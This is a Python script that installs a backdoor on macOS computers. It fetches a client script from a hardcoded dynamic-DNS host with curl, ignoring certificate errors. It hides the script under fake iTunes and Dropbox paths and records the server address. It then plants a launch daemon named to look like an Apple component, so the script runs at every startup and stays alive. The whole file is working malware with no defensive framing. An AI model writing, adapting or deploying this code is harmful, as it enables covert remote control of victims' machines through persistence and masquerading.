import getpass
import os
import subprocess
import sys
import platform

HOST = 'renmusxd.ddns.net'
PORT = 1708
HOSTINFOFILE = '.host'
IDFILE = '.id'

###
#
# All the install scripts are below
#
###

STARTUP_PLIST = ('<?xml version="1.0" encoding="UTF-8"?>' + '\n'
                '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
                '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">' + '\n'
                '<plist version="1.0">' + '\n'
                '<dict>' + '\n'
                '\t' + '<key>Label</key>' + '\n'
                '\t' + '<string>com.apple.libraryindex</string>' + '\n'
                '\t' + '<key>WorkingDirectory</key>' + '\n'
                '\t' + '<string>{pwd}</string>' + '\n'
                '\t' + '<key>ProgramArguments</key>' + '\n'
                '\t' + '<array>' + '\n'
                '\t\t' + '<string>{python_path}</string>' + '\n'
                '\t\t' + '<string>{script_path}</string>' + '\n'
                '\t' + '</array>' + '\n'
                # '\t' + '<key>StandardErrorPath</key>' + '\n'
                # '\t' + '<string>/var/log/flylog.error</string>' + '\n'
                '\t' + '<key>RunAtLoad</key>' + '\n'
                '\t' + '<true/>' + '\n'
                '\t' + '<key>StartInterval</key>' + '\n'
                '\t' + '<integer>60</integer>' + '\n'
                '\t' + '<key>KeepAlive</key>' + '\n'
                '\t' + '<true/>' + '\n'
                '\t' + '<key>AbandonProcessGroup</key>' + '\n'
                '\t' + '<true/>' + '\n'
                '</dict>' + '\n'
                '</plist>' + '\n')

STARTUP_LOCS = ['/System/Library/LaunchAgents',
                '/System/Library/LaunchDaemons',
                '~/Library/LaunchAgents']
DAEMON_NAME = 'com.apple.libraryindex.plist'

SCRIPT_LOCS = ['~/Music/iTunes/.library.py', '~/.dropbox/.index.py']

INSTALL_FLAG = '-install'


def install_and_run_osx(host, port):
    """
    Install onto target osx computer
    :param host: server host addr
    :param port: server port
    """
    print("[*] Installing on OSX")
    # Find python
    proc = subprocess.Popen(["which", "python"], stdout=subprocess.PIPE)
    (out, err) = proc.communicate()
    if err is not None:
        return False
    try:
        python_path = str(out.decode('utf-8')).strip()
    except:
        python_path = str(out).strip()

    print("Python path:\t{}".format(python_path))
    # First find a location for the script
    script_path = None
    for loc in SCRIPT_LOCS:
        script_path = os.path.expanduser(loc)
        if not os.path.exists(script_path):
            try:
                curlproc = subprocess.Popen(["curl", "-k", "-o", script_path, "https://"+host+'/client/minclient.py'],
                                            stdout=subprocess.PIPE)
                (out, err) = curlproc.communicate()
                if err is not None:
                    print(err)
                    raise Exception(err)
                print("[+] Script written to:\t{}".format(script_path))
                break
            except Exception as e:
                print(e)
        else:
            print("[*] Script exists in path:\t{}".format(script_path))
            break
    if script_path is None:
        print("[!] No suitable path found")
        return False
    # Install host information
    script_dir = os.path.dirname(script_path)
    try:
        with open(os.path.join(script_dir,HOSTINFOFILE),"w") as f:
            f.write(host + "\n")
            f.write(str(port))
    except IOError:
        sys.stderr.write("[!] Could not write to " + HOSTINFOFILE)

    # Now we have hidden the script

    for loc in STARTUP_LOCS:
        daemon_loc = os.path.join(os.path.expanduser(loc), DAEMON_NAME)
        if not os.path.exists(daemon_loc):
            try:
                print("[*] Attempting to write PLIST:\t{}".format(daemon_loc))
                with open(daemon_loc, "w") as f:
                    f.write(STARTUP_PLIST.format(python_path=python_path,
                                                 script_path=script_path,
                                                 pwd=os.path.dirname(script_path)))
                os.system('launchctl load -w '+daemon_loc)
                print("[+] PLIST written")
                return True
            except Exception as e:
                print(e)
    print("[-] PLIST not written")
    return False

def getInfo():
    """Get information about system"""
    user = getpass.getuser()
    if platform.system() == 'Darwin':
        arch = 'OSX ' + platform.mac_ver()[0] + ' ' + platform.mac_ver()[2]
    else:
        arch = platform.system() + " " + platform.release()
    return user, arch

user, arch = getInfo()
hostaddr = HOST
hostport = PORT
if len(sys.argv) > 1:
    hostaddr = sys.argv[1]
if len(sys.argv) > 2:
    hostport = sys.argv[2]

if arch.startswith('OSX'):
    install_and_run_osx(hostaddr,hostport)
else:
    print("Non supported")
